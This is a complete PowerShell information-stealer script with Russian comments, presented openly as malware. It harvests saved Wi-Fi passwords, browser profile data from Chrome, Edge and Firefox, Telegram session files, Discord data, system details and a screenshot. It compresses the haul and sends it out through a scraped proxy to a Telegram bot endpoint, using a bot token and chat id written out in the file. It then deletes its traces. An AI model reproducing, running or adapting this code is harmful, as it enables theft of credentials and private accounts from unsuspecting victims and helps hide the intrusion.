# Powershell стриллер с прокси и полным сбором
$T=$env:TEMP+"\stoler_data"
$Z=$env:TEMP+"\data.zip"
New-Item -Path $T -ItemType Directory -Force|Out-Null

# Системная информация
$info=@{
    hostname=(hostname)
    user=$env:USERNAME
    ip=(Invoke-WebRequest -Uri '2ip.io' -UseBasicParsing -TimeoutSec 5).Content.Trim()
    os=(Get-CimInstance Win32_OperatingSystem).Caption
}
$info|ConvertTo-Json|Out-File "$T\system_info.txt" -Encoding UTF8

# Wi-Fi пароли
$profiles=(netsh wlan show profiles|Select-String ':'|%{$_.ToString().Split(':')[1].Trim()})
foreach($p in $profiles){
    $pass=(netsh wlan show profile name="`"$p`"" key=clear|Select-String 'Key Content')
    if($pass){"$p : $($pass.ToString().Split(':')[1].Trim())"}}|Out-File "$T\wifi.txt" -Encoding UTF8

# Браузеры
$browsers=@{
    Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    Firefox="$env:APPDATA\Mozilla\Firefox\Profiles"
}
foreach($b in $browsers.Keys){
    if(Test-Path $browsers[$b]){
        New-Item -Path "$T\browsers\$b" -Type Dir -Force|Out-Null
        Copy-Item "$($browsers[$b])\*" "$T\browsers\$b" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Telegram
$tg="$env:APPDATA\Telegram Desktop\tdata"
if(Test-Path $tg){Copy-Item $tg "$T\telegram" -Recurse -Force}

# Discord
$dc="$env:APPDATA\discord"
if(Test-Path $dc){Copy-Item $dc "$T\discord" -Recurse -Force}

# Скриншот
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap=New-Object System.Drawing.Bitmap $screen.Width,$screen.Height
$graphics=[System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$screen.Size)
$bitmap.Save("$T\screenshot.png")

Compress-Archive -Path "$T\*" -DestinationPath $Z -Force -CompressionLevel Optimal

$proxies=@()
$sources=@(
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
)
foreach($url in $sources){
    try{$proxies+=(Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5).Content -split "`n"}catch{}
}
$proxies=$proxies|Where-Object{$_ -match '\d+\.\d+\.\d+\.\d+:\d+'}|Select-Object -Unique|Select-Object -First 30

$proxy=$null
foreach($p in $proxies){
    try{
        $test=Invoke-WebRequest -Uri 'http://ip-api.com/json' -Proxy $p -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
        $country=($test.Content|ConvertFrom-Json).countryCode
        if($country -notin @('RU','BY','KZ','UA','AM','AZ','GE','MD','KG','TJ','TM','UZ')){
            $proxy=$p
            break
        }
    }catch{}
}

$url="https://api.telegram.org/bot8988262123:AAGULb5xniATGqNC60nCJYrbq_-aIKMHFwQ/sendDocument"
$form=New-Object System.Net.Http.MultipartFormDataContent
$fs=[System.IO.File]::OpenRead($Z)
$fc=New-Object System.Net.Http.StreamContent($fs)
$fc.Headers.ContentDisposition=New-Object System.Net.Http.Headers.ContentDispositionHeaderValue('form-data')
$fc.Headers.ContentDisposition.Name='document'
$fc.Headers.ContentDisposition.FileName='data.zip'
$form.Add($fc)
$form.Add((New-Object System.Net.Http.StringContent('761051987')), 'chat_id')

if($proxy){
    $handler=New-Object System.Net.Http.HttpClientHandler
    $handler.Proxy=New-Object System.Net.WebProxy($proxy)
    $client=New-Object System.Net.Http.HttpClient($handler)
}else{
    $client=New-Object System.Net.Http.HttpClient
}
$client.Timeout=[System.TimeSpan]::FromSeconds(60)
$client.PostAsync($url,$form).Wait()

# Очистка
Start-Sleep 5
Remove-Item $T -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $Z -Force -ErrorAction SilentlyContinue
[System.GC]::Collect()
